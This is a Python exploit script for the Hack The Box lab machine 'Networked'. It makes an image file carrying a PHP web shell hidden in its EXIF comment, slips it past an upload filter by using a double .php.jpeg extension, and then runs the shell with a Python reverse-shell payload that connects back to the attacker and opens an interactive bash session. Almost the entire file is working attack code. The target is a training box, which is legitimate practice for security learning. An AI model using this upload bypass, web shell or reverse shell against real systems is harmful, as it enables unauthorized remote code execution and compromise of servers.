# -*- coding: utf-8 -*-

# Networked HTB Box File Upload + RCE
# CVE: -
# Exploit author: nullarmor
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import os
import random
import requests
import string
import sys
from PIL import Image
from pwn import *
from time import sleep

def main():
    
    # args
    argparser = argparse.ArgumentParser(description='Networked HTB Box File Upload + RCE', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
    
    
    def string_generator(range_):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(range_))
        
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")
 
        l.sendline("""whoami""")
        l.interactive()
        
    def shell_upload():
        
        print(" [*] Generating the image and injecting PHP shell into it...")
        
        try:
            img = Image.new('RGB', (60, 30), color = 'red')
            img.save('{}.php.jpeg'.format(randname))
            
            os.system("exiftool -Comment='<?=`$_GET[0]`?>' {}.php.jpeg -q".format(randname))
            os.rename("{}.php.jpeg".format(randname), "/tmp/{}.php.jpeg".format(randname))
            os.remove("{}.php.jpeg_original".format(randname))
            
            
        except Exception as e:
            print(e)
            print(" [*] Failed to generate the web shell.")
            sys.exit(1)    
        
        else:    
            print(" [*] Uploading the web shell to the box...")
            
            files = {
                'myFile': ('{}.php.jpeg'.format(randname), open('/tmp/{}.php.jpeg'.format(randname), 'rb'), 'image/jpeg'),
                'submit': (None, 'go!')
            }
            
            try:
                if burpsuite:
                    r = requests.post('http://10.10.10.146/upload.php', files=files, proxies=proxies)
                else:
                    r = requests.post('http://10.10.10.146/upload.php', files=files)
            
            except Exception as e:
                print(e)
                print(" [*] Failed to upload the web shell due an error.")
                sys.exit(1)
            
            else:
                if 'file uploaded' in r.text:
                    ip = lhost.replace('.', '_')
                    print(" [*] Shell uploaded with success, check: http://10.10.10.146/uploads/{}.php.jpeg?0=id".format(ip))
                    
                    return True
                else:
                    print(" [*] Failed to upload the web shell.")
                    sys.exit(1)
    
    def trigger_revshell():
    
        print(" [*] Triggering the reverse shell...")
        
        py_payload = "python -c 'import socket,subprocess,os;"
        py_payload += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        py_payload += "s.connect((\"{}\",{}));".format(lhost, lport)
        py_payload += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        py_payload += "p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        
        ip = lhost.replace('.', '_')
        l = listen(lport)
        
        try:
            requests.get("http://10.10.10.146/uploads/{}.php.jpeg?0={}".format(ip, py_payload), timeout=3)
        except:
            reverse_shell(l)
    
    # main
    print(" [>] Networked HTB Box File Upload + RCE")
    print(" [*] Python script exploit author: nullarmor")
    
    randname = string_generator(8)
    if shell_upload():
        trigger_revshell()
    

if __name__ == "__main__":
    main()
